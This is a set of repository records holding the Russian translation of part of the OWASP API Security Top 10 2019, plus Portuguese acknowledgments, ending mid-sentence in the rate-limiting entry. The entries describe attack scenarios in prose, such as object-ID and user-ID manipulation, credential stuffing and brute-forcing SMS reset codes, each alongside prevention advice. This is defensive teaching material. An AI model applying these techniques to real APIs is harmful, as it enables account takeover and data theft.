{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0xd1-acknowledgments.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0xd1-acknowledgments.md", "content": "# Agradecimentos\n\n## Agradecimento ao Contribuidores\n\nGostaríamos de agradecer às pessoas abaixo, as quais contribuíram publicamente\nno GitHub ou por outros meios:\n\n* 007divyachawla\n* Abid Khan\n* Adam Fisher\n* anotherik\n* bkimminich\n* caseysoftware\n* Chris Westphal\n* dsopas\n* DSotnikov\n* emilva\n* ErezYalon\n* flascelles\n* Guillaume Benats\n* IgorSasovets\n* Inonshk\n* JonnySchnittger\n* jmanico\n* jmdx\n* Keith Casey\n* kozmic\n* LauraRosePorter\n* Matthieu Estrade\n* nathanawmk\n* PauloASilva\n* pentagramz\n* philippederyck\n* pleothaud\n* r00ter\n* Raj kumar\n* Sagar Popat\n* Stephen Gates\n* thomaskonrad\n* xycloops123\n", "timestamp": "2025-10-24T22:26:44.466004"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0x00-header.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0x00-header.md", "content": "---\ntitle: ''\n---\n\n![OWASP LOGO](images/owasp-logo.png)\n\n# OWASP API Security Top 10 2019\n\nДесять наиболее критичных рисков безопастности API\n\n29 Мая 2019 года\n\n![OWASP Logo URL TBA](images/front-wasp.png)\n\n| | | |\n| - | - | - |\n| https://owasp.org | В соответствии с лицензией [Creative Commons Attribution-ShareAlike 4.0 International License][1] | ![Creative Commons License Logo](images/front-cc.png) |\n\n[1]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:45.109610"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0x00-notice.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0x00-notice.md", "content": "# Примечание\n\nЭто текстовая версия OWASP API Security Top 10, используемая для создания официальной версии, распространяемой в формате PDF.\n\nСодействие в проекте, например, комментарии, исправления или перевод должны быть сделаны здесь. За подробностями о [cодействии][1] обратитесь к [CONTRIBUTING.md][1].\n\n* Erez Yallon\n* Inon Shkedy\n\n[1]: ../../../CONTRIBUTING.md\n", "timestamp": "2025-10-24T22:26:45.221382"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0x00-toc.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0x00-toc.md", "content": "# Содержание\n\n* [Содержание](0x00-toc.md)\n* [Об OWASP](0x01-about-owasp.md)\n* [Предисловие](0x02-foreword.md)\n* [Введение](0x03-introduction.md)\n* [Анонс выпуска](0x04-release-notes.md)\n* [Риски безопасности API](0x10-api-security-risks.md)\n* [OWASP Top 10 API Security Risks – 2019](0x11-t10.md)\n* [API1:2019 Некорректная Авторизация на Уровне Объектов](0xa1-broken-object-level-authorization.md)\n* [API2:2019 Некорректная Аутентификация Пользователей](0xa2-broken-user-authentication.md)\n* [API3:2019 Предоставление Излишних Данных](0xa3-excessive-data-exposure.md)\n* [API4:2019 Отсутствие ограничений на количество запросов и потребляемые ресурсы](0xa4-lack-of-resources-and-rate-limiting.md)\n* [API5:2019 Некорректная авторизация на уровне функций](0xa5-broken-function-level-authorization.md)\n* [API6:2019 Массовое переназначение параметров](0xa6-mass-assignment.md)\n* [API7:2019 Ошибки настроек безопасности](0xa7-security-misconfiguration.md)\n* [API8:2019 Инъекции](0xa8-injection.md)\n* [API9:2019 Ненадлежащее управление активами](0xa9-improper-assets-management.md)\n* [API10:2019 Недостаточное логирование и мониторинг](0xaa-insufficient-logging-monitoring.md)\n* [Дальнейшие шаги для разработчиков](0xb0-next-devs.md)\n* [Дальнейшие шаги для DevSecOps](0xb1-next-devsecops.md)\n* [Методология и данные](0xd0-about-data.md)\n* [Благодарность](0xd1-acknowledgments.md)\n", "timestamp": "2025-10-24T22:26:45.332945"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0x01-about-owasp.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0x01-about-owasp.md", "content": "# Об OWASP\n\nOpen Web Application Security Project (OWASP) - открытое сообщество, нацеленное на предоставление возможности организациям разрабатывать, покупать и поддерживать приложения и API, которым можно доверять.\n\nВ OWASP вы найдёте открытые и бесплатные:\n\n* Инструменты и стандарты по безопасности приложений.\n* Полноценные книги по тестированию безопасности, разработке безопасного кода и код ревью на безопасность.\n* Презентации и [видео][1].\n* [Списки рекомендаций (Cheat sheets)][2] на разные темы.\n* Стандартизированные меры безопасности и библиотеки.\n* [Локальные отделения по всему миру][3].\n* Современнейшие исследования.\n* Масштабные [конференции по всему миру][4].\n* [Списки рассылки][5].\n\nУзнайте больше на [https://www.owasp.org][6].\n\nВсе инструменты, документы, видео, презентации и отделения OWASP бесплатны и открыты для всех, кто заинтересован в улучшении безопасности разработки приложений.\n\nМы выступаем за подход к безопасности к разработке приложений как к проблеме на уровне людей, процессов и технологий, поскольку наиболее эффективные методы обеспечения безопасности приложений требует улучшения на всех этих уровнях.\n\nOWASP - это новый вид организации. Наша свобода от давления коммерческих организаций позволяет нам предоставлять беспристрастную, практичную и экономически оправданную информацию о безопасности приложений.\n\nOWASP не аффилирован ни с какими технологическими компаниям, однако мы поддерживаем информированное использование коммерческих технологий по безопасности. OWASP создаёт множество материалов коллективным, прозрачным и открытым способом.\n\nOWASP Foundation - некоммерческая организация, обеспечивающая долговременный успех проекта. Почти все участники OWASP - волонтёры, включая исполнительный комитет OWASP, руководителей отделений, лидеров и участников проектов. Мы поддерживаем инновационные исследования по безопасности грантами и инфраструктурой.\n\nПрисоединяйтесь к нам!\n\n## Право интелектуальной собственности и лицензии\n\n![license](images/license.png)\n\nПраво интелектуальной собственности © 2003-2019 The OWASP Foundation. \nЭтот документ выпущен в соответствии с [лицензией Creative Commons Attribution Share-Alike 4.0][7]. При переиспользовании или распространении вы обязаны разъяснить условия лицензии данного документа.\n\n[1]: https://www.youtube.com/user/OWASPGLOBAL\n[2]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[3]: https://www.owasp.org/index.php/OWASP_Chapter\n[4]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[5]: https://lists.owasp.org/mailman/listinfo\n[6]: https://www.owasp.org\n[7]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:45.440969"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0x02-foreword.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0x02-foreword.md", "content": "# Предисловие\n\nПрограммный интерфейс приложений (API) - фундаментальный элемент инноваций в современном, движимом приложениями мире. API - важная составляющая современных мобильных, SaaS и веб приложений, используемая в клиентских, партнерских и внутренних приложениях от банковской сферы, сфер розничных продаж и логистики до интернета вещей, автономных автомобилей и умных городов.\n\nПо своей природе API раскрывают логику приложения и критичные данные, например, персональные данные, именно поэтому API все чаще становятся целью злоумышленников. Стремительные инновации невозможны без безопасных API.\n\nНесмотря на то, что более обширный Web Application Security Risks Top 10 по прежнему актуален, ввиду специфики API, необходим отдельный список рисков безопасности специфичных для API. Безопасность API фокусируется на стратегиях и решениях, направленных на понимание и предотвращение уникальных уязвимостей и рисков безопасности, связанных с использованием API.\n\nЕсли вы уже знакомы с [OWASP Top 10 Project][1], то наверняка заметите сходства с настоящим документом, их основная цель - улучшение читаемости и повышение частоты использования настоящего документа. Если вы не знакомы с семейством OWASP Top 10, то рекомендуем сначала ознакомиться с секциями [Риски Безопасности API][2] и [Методология и Данные][3] перед погружением в список Top 10.\n\nВы можете посодействовать OWASP API Security Top 10 своими вопросами, комментариями и идеями в нашем репозитории GitHub:\n\n* https://github.com/OWASP/API-Security/issues\n* https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n\nВы можете ознакомиться с OWASP API Security Top 10 здесь:\n\n* https://www.owasp.org/index.php/OWASP_API_Security_Project\n* https://github.com/OWASP/API-Security\n\nМы хотим поблагодарить всех участников проекта, которые своим вкладом и стараниями помогли проекту свершиться. Все они перечислены в секции [Благодарность][4]. Спасибо вам!\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd0-about-data.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:45.557192"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0x03-introduction.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0x03-introduction.md", "content": "# Введение\n\n## Добро пожаловать в OWASP API Security Top 10 - 2019!\n\nДобро пожаловать в первую версию OWASP API Security Top 10. Если вы знакомы с семейством OWASP Top 10, то вы заметите сходства, их основная цель - улучшение читаемости и повышение частоты использования настоящего документа. В противном случае посетите страницу [OWASP API Security Project wiki][1] перед погружением в наиболее критичные риски безопасности API.\n\nAPI играют важную роль в архитектуре современных приложений. Поскольку информированность в сфере безопасности и инновации движутся с разной скоростью, важно сфокусироваться на общих недостатках безопасности API.\n\nОсновная цель OWASP API Security Top 10 - предоставить информацию людям, вовлечённым в разработку и поддержание API, например, разработчикам, дизайнерам, архитекторам, менеджерам или целым организациям.\n\nВ секции [Методология и Данные][2] вы можете более подробно ознакомиться с тем, как была создана текущая версия. В будущих версиях мы хотим вовлечь индустрию безопасности путём публичного сбора данных. А сейчас мы призываем всех внести свой вклад вопросами, комментариями и идеями в нашем [GitHub репозитории][3] или [Списке рассылки][4].\n\n[1]: https://www.owasp.org/index.php/OWASP_API_Security_Project\n[2]: ./0xd0-about-data.md\n[3]: https://github.com/OWASP/API-Security\n[4]: https://groups.google.com/a/owasp.org/forum/#!forum/api-security-project\n", "timestamp": "2025-10-24T22:26:45.678131"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0x04-release-notes.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0x04-release-notes.md", "content": "# Анонс выпуска\n\nЭто первая версия OWASP API Security Top 10, которую мы планируем обновлять каждые три-четыре года.\n\nВ будущих версиях, в отличие от этой, мы планируем публичный сбор данных, вовлекая индустрию безопасности в эту активность. В секции [Методология и Данные][1] вы можете найти подробности о том, как эта версия была создана. Для дополнительной информации о рисках безопасности обратитесь к секции [Риски безопасности API][2].\n\nНеобходимо понимать, что за последние несколько лет архитектура приложений значительно изменилась. В настоящий момент API играют очень важную роль в новой архитектуре микросервисов, одностраничных приложений (SPA), мобильных приложений, интернете вещей и так далее.\n\nOWASP API Security Top 10 - попытка повысить информированность о проблемах безопасности современных API. Он был возможен благодаря труду волонтёров, перечисленных в секции [Благодарность][3]. Спасибо вам!\n\n[1]: ./0xd0-about-data.md\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:45.792098"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0x10-api-security-risks.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0x10-api-security-risks.md", "content": "# Риски безопасности API\n\nДля анализа рисков была использована [Методология оценки рисков OWASP][1].\n\nТерминология, относящаяся к оценкам риска, приведена в таблице ниже.\n\n| Источники угроз | Сложность эксплуатации | Распространенность | Сложность обнаружения | Технические последствия | Последствия для бизнеса |\n| :-: | :-: | :-: | :-: | :-: | :-: |\n| Зависит от API | Просто: **3** | Широкая **3** | Просто **3** | Значительные **3** | Зависит от бизнеса |\n| Зависит от API | Средне: **2** | Обычная **2** | Средне **2** | Средние **2** | Зависит от бизнеса |\n| Зависит от API | Сложно: **1** | Редкая **1** | Сложно **1** | Незначительные **1** | Зависит от бизнеса |\n\n**Примечание**: Этот подход не принимает во внимание источник угроз, а также различные технические детали вашего конкретного приложения. Любой из этих факторов может значительно повлиять на общую вероятность обнаружения и эксплуатации злоумышленником конкретной уязвимости. Эта система оценки не принимает во внимание фактические последствия для вашего бизнеса. Вашей организации необходимо решить, какие риски безопасности, создаваемые приложениями и API, она готова принять с учётом её культуры безопасности, индустрии и требований регуляторов. Проведение анализа рисков за вас не является целью OWASP API Security Top 10.\n\n## Ссылки\n\n### OWASP\n\n* [OWASP Risk Rating Methodology][1]\n* [Article on Threat/Risk Modeling][2]\n\n### Внешние\n\n* [ISO 31000: Risk Management Std][3]\n* [ISO 27001: ISMS][4]\n* [NIST Cyber Framework (US)][5]\n* [ASD Strategic Mitigations (AU)][6]\n* [NIST CVSS 3.0][7]\n* [Microsoft Threat Modeling Tool][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: https://www.owasp.org/index.php/Threat_Risk_Modeling\n[3]: https://www.iso.org/iso-31000-risk-management.html\n[4]: https://www.iso.org/isoiec-27001-information-security.html\n[5]: https://www.nist.gov/cyberframework\n[6]: https://www.asd.gov.au/infosec/mitigationstrategies.htm\n[7]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n[8]: https://www.microsoft.com/en-us/download/details.aspx?id=49168\n", "timestamp": "2025-10-24T22:26:45.914380"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0x11-t10.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0x11-t10.md", "content": "# OWASP Top 10 API Security Risks – 2019\n\n| Риск | Описание |\n| ---- | ----------- |\n| API1:2019 - Некорректная Авторизация на Уровне Объектов | API зачастую предоставляют точки входа, оперирующие идентификаторами объектов, тем самым создавая широкую поверхность атаки на уровне управления доступом. Необходимо принимать во внимание проверки авторизации на уровне объектов в каждой функции, которая обращается к источнику данных, используя пользовательский ввод. |\n| API2:2019 - Некорректная Аутентификация Пользователей | Механизмы аутентификации часто функционируют некорректно, позволяя злоумышленникам компрометировать аутентификационные токены или эксплуатировать несовершенства в реализации механизма с целью временного или постоянного присвоения учетной записи пользователя. Компрометация системы идентификации пользователей или клиентов компрометирует API в целом. |\n| API3:2019 - Предоставление Излишних Данных | Будучи нацеленными на универсальную реализацию функций API, разработчики зачастую раскрывают все свойства объектов, не учитывая критичность каждого из них и рассчитывая, что клиентское приложение отфильтрует данные перед отображением пользователю. |\n| API4:2019 - Отсутствие ограничений на количество запросов и потребляемые ресурсы | Зачастую API не устанавливают ограничений на размер или количество ресурсов, запрашиваемых клиентским приложением или пользователем. Это может повлиять на производительность API, приводя к отказу в обслуживании, а также открывает возможность атак перебором на механизм аутентификации. |\n| API5:2019 - Некорректная авторизация на уровне функций | Сложные политики контроля доступа с различными иерархиями, группами и ролями, а также нечеткое разделение административного и пользовательского функционала приводят к ошибкам механизма авторизации. Эксплуатируя эти ошибки, злоумышленник может получить доступ к ресурсам других пользователей и административному функционалу. |\n| API6:2019 - Массовое переназначение параметров (Mass assignment) | Присвоение поступивших от пользователя данных, например в формате JSON, модели данных без надлежащей фильтрации параметров на базе белого списка обычно приводит к массовому переназначению параметров. Злоумышленник может изменить свойства объектов, к которым он не должен иметь доступ, угадав эти свойства, найдя их в других точках входа API или документации, или же отправив запрос с дополнительными свойствами. |\n| API7:2019 - Ошибки настроек безопасности | Как правило, ошибки настроек безопасности - результат небезопасных настроек по умолчанию, неполных или временных настроек, незащищенного облачного хранилища, некорректно настроенных заголовков HTTP, излишних методов HTTP, нестрогой политики разделения ресурсов между источниками (CORS) и детальных сообщений об ошибках, содержащих критичные данные. |\n| API8:2019 - Инъекции | Инъекции, такие как SQL, NoSQL, инъекции команд на операционной системе и другие, случаются, когда недоверенные данные отправляются в интерпретатор как часть команды или запроса. Злоумышленник может вынудить интерпретатор выполнить команду или получить данные в обход проверок авторизации. |\n| API9:2019 - Ненадлежащее управление активами | API обычно имеют больше точек входа по сравнению с традиционным веб приложениями, что приводит к необходимости постоянного ведения и обновления документации. Надлежащая инвентаризация хостов (доменов и серверов, на которых функционирует API) и развернутых версий API играет важную роль в предотвращении проблем, таких как публикация устаревших версий API и точек входа, используемых для отладки. |\n| API10:2019 - Недостаточное логирование и мониторинг | Недостаточное логирование и мониторинг вместе с отсутствующим или неэффективным реагированием на инциденты позволяет злоумышленникам атаковать и оставаться в системе, атаковать другие системы, доступные из скомпрометированной, а также извлекать или уничтожать данные. Большинство исследований произошедших атак показывает, что время обнаружения атак превышает 200 дней, а также что обычно атаки обнаруживаются извне, а не внутренними процессами или мониторингом. |\n", "timestamp": "2025-10-24T22:26:46.037054"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0xa1-broken-object-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0xa1-broken-object-level-authorization.md", "content": "# API1:2019 Некорректная Авторизация на Уровне Объектов\n\n| Источники угроз/Векторы атак | Недостатки безопасности | Последствия |\n| - | - | - |\n| Зависит от API : Сложность эксплуатации **3** | Распространенность **3** : Сложность обнаружения **2** | Технические последствия **3** : Зависит от бизнеса |\n| Злоумышленник может проэксплуатрировать уязвимые к некорректной авторизации на уровне объектов точки входа API, манипулируя идентификатором объекта, отправляемого в запросе. Это может привести к неавторизованному доступу к критичной информации. Это очень распространненая ситуация среди приложений базирующихся на API, потому что серверная часть не полностью отслеживает состояние клиента, а вместо это полагается на отправляемые клиентом параметры, например, идентификатор объекта, чтобы принять решение, к какому объекту осуществляется доступ.| Данная атака на API наиболее распространена и несет наибольшие последствия. Авторизация и механизмы контроля доступа в современных приложениях повсеместны и зачастую запутаны. Даже если проверки авторизации реализованы в приложении корректно, разработчики могут забыть добавить эти проверки перед доступом к критичным объектам. Автоматизированное статическое и динамическое тестирование, как правило, не обнаруживает проблемы в управлении доступом. | Неавторизованный доступ может привести к потере или манипуляции данными, а также разглашению данных лицам, не имеющим права доступа к ним. Кроме того неавторизованный доступ может привести к получению полного контроля над учетными записями. |\n\n## Как определить, является ли API уязвимым?\n\nАвторизация на уровне объектов - это механизм управления доступом, реализуемый на уровне кода и проверяющий, что пользователь может получить доступ только к тем объектам, к которым у него должен быть доступ.\n\nКаждая точка входа API, получающая идентификатор объекта и выполняющая любое действие с объектом, должна провести проверку авторизации на уровне объекта. Проверка должна удостовериться в том, что текущий пользователь действительно имеет право осуществить запрошенное действие над запрошенным объектом.\n\nНекорректная работа этого механизма обычно приводит к неавторизованному разглашению или изменению данных, а также к их уничтожению.\n\n## Пример сценария атаки\n\n### Сценарий #1\n\nТорговая онлайн платформа для онлайн магазинов предоставляет страницу с графиками доходов для каждого размещенного на платформе магазина. Злоумышленник, проанализировав отправляемые браузером запросы, может найти точки входа API, предоставляющие данные для графиков и определить формат запросов к ним `/shops/{shopName}/revenue_data.json`. Используя другую точку входа API, злоумышленник может получить список названий всех магазинов, размещенных на платформе. Используя простой скрипт, заменяющий `{shopName}` в URL запроса на названия магазинов, злоумышленник может получить доступ к данным о продажах тысяч онлайн магазинов.\n\n### Сценарий #2\n\nЗлоумышленник анализирует сетевой трафик носимого устройства, и HTTP `PATCH` запрос, содержащий нестандартный HTTP заголовок `X-User-Id: 54796`, привлекает его внимание. Изменив значение заголовка `X-User-Id` на `54795`, злоумышленник получает ответ сервера, означающий успешную обработку запроса. Это означает, что злоумышленник может изменять данные учетных записей других пользователей.\n\n## Как предотвратить\n\n* Надлежащим образом внедрить механизм авторизации, основывающийся на иерархии и политиках пользователей.\n* Использовать механизм авторизации для проверки того, что текущий аутентифицированный пользователь имеет право доступа к запрошенному действию над записью в базе данных в каждой функции, использующей пользовательский ввод для доступа к записи.\n* Использовать случайно сгенерированные значения, например, GUID в качестве идентификаторов записей в базе данных.\n* Использовать тесты, проверяющие корректность работы механизма авторизации. Не пропускать уязвимые изменения, которые не проходят тесты.\n\n## Ссылки\n\n### Внешние\n\n* [CWE-284: Improper Access Control][1]\n* [CWE-285: Improper Authorization][2]\n* [CWE-639: Authorization Bypass Through User-Controlled Key][3]\n\n[1]: https://cwe.mitre.org/data/definitions/284.html\n[2]: https://cwe.mitre.org/data/definitions/285.html\n[3]: https://cwe.mitre.org/data/definitions/639.html\n", "timestamp": "2025-10-24T22:26:46.144543"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0xa2-broken-user-authentication.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0xa2-broken-user-authentication.md", "content": "# API2:2019 Некорректная Аутентификация Пользователей\n\n| Источники угроз/Векторы атак | Недостатки безопасности | Последствия |\n| - | - | - |\n| Зависит от API : Сложность эксплуатации **3** | Распространенность **2** : Сложность обнаружения **2** | Технические последствия **3** : Зависит от бизнеса |\n| Аутентификация в API - сложный и запутанный механизм. Разработчики и инженеры безопасности могут иметь неверное представление о том, что входит в понятие аутентификации, и как правильно ее внедрить. Кроме того, механизм аутентификации - простая цель для злоумышленников, поскольку он общедоступен. Все это приводит к тому, что механизм аутентификации потенциально содержит большое число уязвимостей. | Механизм аутентификации подвержен двум основным проблемам: 1. Отсутствие механизмов защиты: разработчики должны обращать особое внимание на точки входа API, отвечающие за аутентификацию, и внедрять дополнительные уровни защиты. 2. Некорректная реализация механизма: механизм используется или реализован, не принимая во внимание основные векторы атак, или используется механизм, не подходящий под текущую ситуацию (например, механизм аутентификации для IoT устройств зачастую не подходит для веб приложений). | Злоумышленник может получить контроль над учетными записями других пользователей в системе, получить доступ к их персональным данным, или осуществить критичные действия от их имени, например, отправить денежные переводы или персональные сообщения. |\n\n## Как определить, является ли API уязвимым?\n\nТочки входа, отвечающие за аутентификацию и процесс аутентификации, - это активы, требующие защиты. Необходимо относиться к функционалу восстановления пароля аналогично механизму аутентификации.\n\nAPI уязвим, если:\n* Позволяет [перебор учетных данных][1], при условии, что у злоумышленника есть списки существующих логинов и паролей.\n* Позволяет злоумышленнику подбирать пароль к одной и той же учетной записи путем перебора, не требуя ввода CAPTCHA или не блокируя учетную запись.\n* Допускает слабые пароли.\n* Передает критичные аутентификационные данные в URL, например, аутентификационные токены или пароли.\n* Не проверяет подлинность токенов.\n* Допускает JWT токены не содержащие подпись (`\"alg\":\"none\"`) или использующие уязвимые алгоритмы подписи, не проверяет срок действия токена. \n* Хранит пароли в открытом виде или в хэшированном виде с использованием слабых алгоритмов хеширования.\n* Использует слабые ключи шифрования.\n\n## Примеры сценариев атаки\n\n## Сценарий #1\n\n[Перебор учетных данных][1] с использованием [списка известных логинов и паролей][2] - распространенная атака. Если в приложении отсутствуют автоматизированные меры защиты от угроз или перебора учетных данных, то оно может быть использовано для определения валидности учетных данных.\n\n## Сценарий #2\n\nЗлоумышленник начинает восстановление пароля, отправив POST запрос в точку входа `/api/system/verification-codes` и указав имя пользователя в теле запроса. Затем одноразовый пароль из 6 цифр отправляется на телефон жертвы. Поскольку API не ограничивает количество запросов, злоумышленник может за несколько минут подобрать корректный одноразовый пароль, перебирая все возможные пароли с помощью скрипта, работающего в многопоточном режиме и отправляющего запросы на `/api/system/verification-codes/{smsToken}`.\n\n## Как предотвратить?\n\n* Идентифицируйте все возможные способы аутентификации в API (для мобильных и веб клиентов, deep links, обеспечивающих аутентификацию в одно нажатие, и так далее).\n* Спросите у разработчиков, какие способы аутентификации вы пропустили.\n* Изучите используемые механизмы аутентификации. Изучите, что они из себя представляют и как используются. OAuth не используется для аутентификации пользователей, так же как и API ключи.\n* Не изобретайте велосипед, когда речь идет об аутентификации, генерации токенов и хранении паролей. Используйте стандарты.\n* Внедрите защиту от перебора, ограничение на количество единовременных запросов и временную блокировку учетных записей на точках входа, отвечающих за восстановление учетных данных и пароля, аналогично мерам защиты на точках входа, используемых для аутентификации.\n* Ознакомьтесь с [OWASP Authentication Cheatsheet][3].\n* Используйте многофакторную аутентификацию, где это возможно.\n* Используйте механизмы защиты от перебора учетных данных, перебора по словарю и перебора всех возможных значений на точках входа, отвечающих за аутентификацию. Эти механизмы должны использовать более строгие правила по сравнению с механизмом ограничивающим количество запросов в остальных точках входа API.\n* Внедрите [блокировку учетных записей][4] или CAPTCHA для предотвращения перебора аутентификационных данных, направленного на единичных пользователей. Внедрите защиту от слабых паролей.\n* Не используйте API ключи для аутентификации пользователей. Они должны использоваться для [аутентификации приложений и проектов, являющихся клиентами API][5].\n\n## Ссылки\n\n### OWASP\n\n* [OWASP Key Management Cheat Sheet][6]\n* [OWASP Authentication Cheatsheet][3]\n* [Credential Stuffing][1]\n\n### Внешние\n\n* [CWE-798: Use of Hard-coded Credentials][7]\n\n[1]: https://www.owasp.org/index.php/Credential_stuffing\n[2]: https://github.com/danielmiessler/SecLists\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n[4]: https://www.owasp.org/index.php/Testing_for_Weak_lock_out_mechanism_(OTG-AUTHN-003)\n[5]: https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\n[6]: https://www.owasp.org/index.php/Key_Management_Cheat_Sheet\n[7]: https://cwe.mitre.org/data/definitions/798.html\n", "timestamp": "2025-10-24T22:26:46.252959"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0xa3-excessive-data-exposure.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0xa3-excessive-data-exposure.md", "content": "# API3:2019 Предоставление Излишних Данных\n\n| Источники угроз/Векторы атак | Недостатки безопасности | Последствия |\n| - | - | - |\n| Зависит от API : Сложность эксплуатации **3** | Распространенность **2** : Сложность обнаружения **2** | Технические последствия **2** : Зависит от бизнеса |\n| Предоставление излишних данных легко эксплуатировать. Для этого нужно перехватить трафик и проанализировать ответы API на предмет критичных данных, которые API не должно возвращать пользователю. | API рассчитывают, что клиентское приложение отфильтрует отображаемые пользователю данные. Поскольку API используются в качестве источника данных, иногда разработчики пытаются сделать его универсальным для всех клиентов, не думая о критичности возвращаемых пользователю данных. Автоматизированные инструменты зачастую не обнаруживают эту уязвимость, поскольку без детального понимания логики приложения очень трудно определить, должно ли API возвращать те или иные данные. | Предоставление излишних данных обычно приводит к разглашению конфиденциальных данных. |\n\n## Как определить, является ли API уязвимым?\n\nAPI уязвим, если он спроектирован так, что возвращает критичные данные клиентскому приложению, которое в свою очередь фильтрует их перед отображением пользователю, то злоумышленник с легкостью может перехватить трафик и увидеть критичные данные.\n\n## Примеры сценариев атаки\n\n## Сценарий #1\n\nКоманда мобильного приложения использует точку входа `/api/articles/{articleId}/comments/{commentId}` для отображения метаданных комментариев в представлении статей. Злоумышленник перехватывает трафик от мобильного приложения и находит в ответе дополнительные критичные данные об авторе комментария. Точка входа реализована так, что использует стандартный метод `toJSON()` на объекте модели `User`, содержащем персональные данные, для сериализации этого объекта.\n\n\n### Сценарий #2\n\nСистема видеонаблюдения, базирующаяся на IOT, позволяет администраторам создавать пользователей с различными привилегиями. Администратор создал учетную запись для нового охранника, которая должна иметь доступ только к определенным зданиям на объекте. Когда охранник использует мобильное приложение, оно отправляет запрос в точку входа `/api/sites/111/cameras`, чтобы получить данные о доступных камерах и отобразить их на панели управления. Ответ API содержит список данных о камерах в следующем формате: `{\"id\":\"xxx\",\"live_access_token\":\"xxxx-bbbbb\",\"building_id\":\"yyy\"}`. Клиентское приложение показывает только те камеры, к которым охранник имеет доступ, однако ответ API содержит полный список камер на объекте.\n\n## Как предотвратить\n\n* Не рассчитывайте, что клиентская часть приложения отфильтрует критичные данные.\n* Проверьте, что ответы API содержат только те данные, которые отображаются клиентским приложением.\n* Разработчики серверной части должны всегда задаваться вопросом \"Кто получит данные?\" перед публикацией новых точек входа API.\n* Избегайте использования стандартных методов, например, `to_json()` или `to_string()`. Вместо этого вручную выбирайте свойства объектов, которые вы возвращаете в ответе.\n* Классифицируйте критичную информацию и персональные данные, с которыми работает приложение, путем анализа всех вызовов API, возвращающих подобные данные, чтобы определить, несут ли эти ответы риски безопасности.\n* Внедрите механизм валидации, базирующийся на проверке данных по схеме, в качестве дополнительного уровня защиты. В рамках этого механизма определите данные возвращаемые каждой точкой входа (в том числе в ошибках) и обеспечьте, что только эти данные возвращаются пользователю.\n\n## Ссылки\n\n### Внешние\n\n* [CWE-213: Intentional Information Exposure][1]\n\n[1]: https://cwe.mitre.org/data/definitions/213.html\n", "timestamp": "2025-10-24T22:26:46.363256"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0xa4-lack-of-resources-and-rate-limiting.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0xa4-lack-of-resources-and-rate-limiting.md", "content": "# API4:2019 Отсутствие Ограничений на Количество Запросов и Потребляемые Ресурсы\n\n| Источники угроз/Векторы атак | Недостатки безопасности | Последствия |\n| - | - | - |\n| Зависит от API : Сложность эксплуатации **2** | Распространенность **3** : Сложность обнаружения **3** | Технические последствия **2** : Зависит от бизнеса |\n| Для эксплуатации необходимы простые запросы к API. Аутентификация не требуется. Злоумышленник может единовременно отправить большое количество запросов, используя локальный компьютер или облачную систему вычислений. | Часто API не ограничивают количество запросов, или эти ограничения настроены некорректно. | Эксплуатация может привести к отказу в обслуживании, выражающемся в долгом времени ответа или полной недоступности API. |\n\n## Как определить, является ли API уязвимым?\n\nЗапросы к API потребляют ресурсы, например, пропускную способность канала, процессорное время, оперативную память и место в хранилище данных. Количество ресурсов, потребляемых для ответа на запрос к API, во многом зависит от пользовательского ввода и бизнес логики точки входа. Кроме того, нужно принимать во внимание то, что запросы от различных клиентов API используют ресурсы совместно. API уязвимо, если хотя бы одно из следующих ограничений отсутствует или имеет некорректное значение (например, слишком высокое или низкое):\n\n* Максимальное время ожидания выполнения\n* Максимальный объем выделяемой памяти\n* Количество файловых дескрипторов\n* Количество процессов\n* Размер полезной нагрузки запроса (например, размер загружаемого файла)\n* Количество запросов на одного клиента или ресурс\n* Количество записей из базы данных, возвращаемых в ответе на один запрос\n\n## Примеры сценариев атаки\n\n## Сценарий #1\n\nЗлоумышленник загружает большое изображение, отправив POST запрос на `/api/v1/images`. После 